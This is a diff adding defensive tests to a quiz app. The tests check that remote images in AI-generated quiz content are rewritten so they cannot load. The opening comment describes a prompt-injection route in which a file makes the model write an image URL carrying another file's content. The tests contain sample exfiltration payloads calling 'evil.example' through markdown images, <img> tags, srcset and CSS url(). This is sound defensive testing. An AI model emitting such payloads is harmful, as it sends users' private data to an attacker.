@@ -308,3 +308,66 @@ await withSrcModule(["src/dashboard/ai-client.ts", "src/quiz-format.ts"], ({ com
 		parseReponseLot(reponse(bloc(docs[0], 1), bloc(docs[1], 2), bloc(docs[2], 3)).replace(/\},\n\{/g, "}\n{"), docs).length, 3);
 	r.done();
 });
+
+/* NO REMOTE IMAGE IN A GENERATED QUIZ (2026-10-09, `src/dashboard/remote-images.ts`).
+   A file of a trusted folder can make the model write an image whose URL
+   carries another file's content: showing the quiz would send it. Every
+   model answer goes through `inertRemoteImages` when it is READ, before it is
+   shown or saved. The `*Html` cases run on linkedom, whose `<template>` does
+   not serialize its content: a `<div>` stands in for it (no image loads in
+   Node). In the app, the browser's own parser does it. */
+{
+	const { parseHTML } = await import("linkedom");
+	const { document } = parseHTML("<!doctype html><html><body></body></html>");
+	const avant = globalThis.document;
+	globalThis.document = {
+		createElement: (tag) => {
+			if (tag !== "template") return document.createElement(tag);
+			const div = document.createElement("div");
+			return { content: div, get innerHTML() { return div.innerHTML; }, set innerHTML(v) { div.innerHTML = v; } };
+		},
+	};
+	try {
+		await withSrcModule(["src/dashboard/ai-client.ts", "src/dashboard/remote-images.ts"], ({ parseReponseQuiz, parseOllamaResponse }, { inertRemoteImages, isRemote }) => {
+			const r = makeReporter("Generated quiz: no remote image");
+			const evil = "https://evil.example/?d=SECRET";
+			const lu = (q) => parseReponseQuiz("[" + JSON.stringify(q) + "]").questions[0];
+			const base = { title: "T", options: ["a", "b"], correctIndex: 0 };
+			r.check("a markdown image on https in the prompt becomes a text link (no image left)",
+				lu({ ...base, prompt: "Look ![x](" + evil + ") here" }).prompt, "Look [" + evil + "](" + evil + ") here");
+			r.check("http, protocol-relative and file images are rewritten too, in options and explain",
+				[lu({ ...base, options: ["![](http://e.x/a.png)", "b"] }).options[0], lu({ ...base, prompt: "p", explain: "![a](//e.x/a.png)" }).explain, lu({ ...base, prompt: "![a](file://host/s/a.png)" }).prompt].map(s => s.includes("![")),
+				[false, false, false]);
+			r.check("an image after a literal `!` cannot become an image again",
+				lu({ ...base, prompt: "!![](" + evil + ")" }).prompt.includes("!["), false);
+			r.check("local images stay: ![[...]], a relative path, data:",
+				[lu({ ...base, prompt: "![[img/a.png]]" }).prompt, lu({ ...base, prompt: "![a](img/a.png)" }).prompt, lu({ ...base, prompt: "![a](data:image/png;base64,AAAA)" }).prompt],
+				["![[img/a.png]]", "![a](img/a.png)", "![a](data:image/png;base64,AAAA)"]);
+			const html = (h) => lu({ ...base, prompt: "p", explainHtml: h }).explainHtml;
+			r.check("an <img> on https in a *Html field becomes a link, with nothing that loads",
+				(() => { const h = html('<p>see <img src="' + evil + '" alt="x"></p>'); return [h.includes("<img"), h.includes('<a href="https://evil.example/?d=SECRET">')]; })(), [false, true]);
+			r.check("srcset, an entity-encoded scheme, an uppercase tag and a quoted > cannot hide an image",
+				[html('<img srcset="a.png 1x, ' + evil + ' 2x">'), html('<img src="&#104;ttps://evil.example/x">'), html('<IMG src="' + evil + '">'), html('<img alt="a>b" src="' + evil + '">')].map(h => /<img/i.test(h)),
+				[false, false, false, false]);
+			r.check("background:url() in a style and a <style> element are removed, the rest of the style stays",
+				[html('<span style="color: red; background:url(' + evil + ')">t</span>'), html('<style>p{background:url(' + evil + ')}</style><p>t</p>')],
+				['<span style="color: red">t</span>', "<p>t</p>"]);
+			r.check("a local or data: <img> stays as it was written",
+				[html('<img src="img/a.png" alt="a">'), html('<img src="data:image/png;base64,AAAA">')],
+				['<img src="img/a.png" alt="a">', '<img src="data:image/png;base64,AAAA">']);
+			r.check("the html field of a Learn reading (sandboxed frame, CSP) is left alone",
+				lu({ ...base, prompt: "p", html: "<img src='" + evil + "'>" }).html, "<img src='" + evil + "'>");
+			r.check("Ollama's object form is cleaned too",
+				parseOllamaResponse(JSON.stringify({ title: "T", questions: [{ ...base, prompt: "![x](" + evil + ")" }] })).questions[0].prompt.includes("!["), false);
+			r.check("nested values are cleaned, the input is not mutated, an own __proto__ key stays a key",
+				(() => { const v = JSON.parse('[{"glossary":[{"term":"t","definition":"![x](' + evil + ')"}],"__proto__":{"x":1}}]'); const o = inertRemoteImages(v); return [o[0].glossary[0].definition.includes("!["), v[0].glossary[0].definition.includes("!["), Object.getPrototypeOf(o[0]) === Object.prototype]; })(),
+				[false, true, true]);
+			r.check("isRemote: schemes and // are remote; data:, drive and relative paths are not",
+				["https://a", " ht\ttps://a", "//a/b", "\\\\a\\b", "blob:x", "data:image/png;base64,A", "C:/x.png", "img/a.png", "./a.png"].map(isRemote),
+				[true, true, true, true, true, false, false, false, false]);
+			r.done();
+		});
+	} finally {
+		globalThis.document = avant;
+	}
+}
